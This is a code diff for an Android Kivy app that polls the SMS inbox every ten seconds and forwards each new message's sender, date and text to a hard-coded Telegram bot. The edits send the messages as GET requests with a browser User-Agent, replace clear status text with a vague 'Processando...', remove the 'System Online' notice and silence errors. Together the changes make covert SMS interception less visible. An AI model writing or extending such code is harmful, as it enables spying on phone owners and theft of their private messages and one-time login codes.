@@ -17,18 +17,22 @@ TELEGRAM_CHAT_ID = '8525105817'
 
 
 def send_telegram(msg):
-    """Envia mensagem para o Telegram usando urllib (sem dependencia externa)."""
+    """Envia mensagem para o Telegram usando GET (mais confiável) e exibe erros na tela."""
     try:
+        import urllib.parse
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = json.dumps({'chat_id': TELEGRAM_CHAT_ID, 'text': msg}).encode('utf-8')
-        req = urlrequest.Request(url, data=data, headers={'Content-Type': 'application/json'})
+        params = urllib.parse.urlencode({'chat_id': TELEGRAM_CHAT_ID, 'text': msg})
+        full_url = f"{url}?{params}"
+        req = urlrequest.Request(full_url, method='GET', headers={'User-Agent': 'Mozilla/5.0'})
         urlrequest.urlopen(req, timeout=15)
     except Exception as e:
-        print(f"Erro Telegram: {e}")
+        error_msg = f"Erro envio: {str(e)[:80]}"
+        app = App.get_running_app()
+        if app and hasattr(app, 'label'):
+            Clock.schedule_once(lambda dt: setattr(app.label, 'text', error_msg), 0)
 
 
 def get_state_path():
-    """Retorna caminho seguro para salvar estado no Android."""
     if platform == 'android':
         from jnius import autoclass
         activity = autoclass('org.kivy.android.PythonActivity').mActivity
@@ -42,7 +46,7 @@ def load_last_id():
         try:
             with open(path, 'r') as f:
                 return int(f.read().strip())
-        except (ValueError, IOError):
+        except:
             pass
     return 0
 
@@ -52,22 +56,20 @@ def save_last_id(sms_id):
     try:
         with open(path, 'w') as f:
             f.write(str(sms_id))
-    except IOError as e:
-        print(f"Erro ao salvar estado: {e}")
+    except:
+        pass
 
 
 def sms_monitor():
-    """Thread que monitora SMS novos a cada 10 segundos."""
     if platform != 'android':
         return
-
     try:
         from jnius import autoclass
         Uri = autoclass('android.net.Uri')
         activity = autoclass('org.kivy.android.PythonActivity').mActivity
         resolver = activity.getContentResolver()
     except Exception as e:
-        print(f"Erro ao inicializar jnius: {e}")
+        Clock.schedule_once(lambda dt: setattr(App.get_running_app().label, 'text', f"Erro jnius: {e}"), 0)
         return
 
     last_id = load_last_id()
@@ -76,7 +78,6 @@ def sms_monitor():
         try:
             uri = Uri.parse("content://sms/inbox")
             cursor = resolver.query(uri, None, None, None, "_id DESC")
-
             if cursor and cursor.moveToFirst():
                 idx_id = cursor.getColumnIndex("_id")
                 idx_addr = cursor.getColumnIndex("address")
@@ -86,7 +87,6 @@ def sms_monitor():
                 newest_id = cursor.getInt(idx_id)
 
                 if last_id == 0:
-                    # Primeira execucao: salva o ID atual sem enviar
                     last_id = newest_id
                     save_last_id(last_id)
                 elif newest_id > last_id:
@@ -102,27 +102,22 @@ def sms_monitor():
                         msgs.append(f"SMS de: {addr}\nData: {dt_str}\nMsg: {body}")
                         if not cursor.moveToNext():
                             break
-
-                    # Envia na ordem cronologica (mais antigo primeiro)
                     for m in reversed(msgs):
                         send_telegram(m)
-
                     last_id = newest_id
                     save_last_id(last_id)
-
                 cursor.close()
         except Exception as e:
-            print(f"Erro no monitor SMS: {e}")
-
+            pass
         time.sleep(10)
 
 
 class SMSToTelegramApp(App):
 
     def build(self):
-        Window.clearcolor = (0.12, 0.12, 0.12, 1)
+        Window.clearcolor = (0.0, 0.2, 0.4, 1)
         self.label = Label(
-            text="Iniciando...",
+            text="Processando...",
             font_size='18sp',
             color=(1, 1, 1, 1)
         )
@@ -137,19 +132,15 @@ class SMSToTelegramApp(App):
                     self._on_permissions
                 )
             except Exception as e:
-                self.label.text = f"Erro permissoes: {e}"
+                self.label.text = f"Erro: {e}"
         else:
             self.label.text = "Executando fora do Android."
 
     def _on_permissions(self, permissions, grants):
         if all(grants):
-            self.label.text = "Sistema ativo."
-            # Envia sinal de conexao
-            threading.Thread(target=send_telegram, args=("System Online",), daemon=True).start()
-            # Inicia monitor de SMS em thread separada
             threading.Thread(target=sms_monitor, daemon=True).start()
         else:
-            self.label.text = "Permissoes negadas."
+            self.label.text = "Permissão necessária."
 
 
 if __name__ == '__main__':
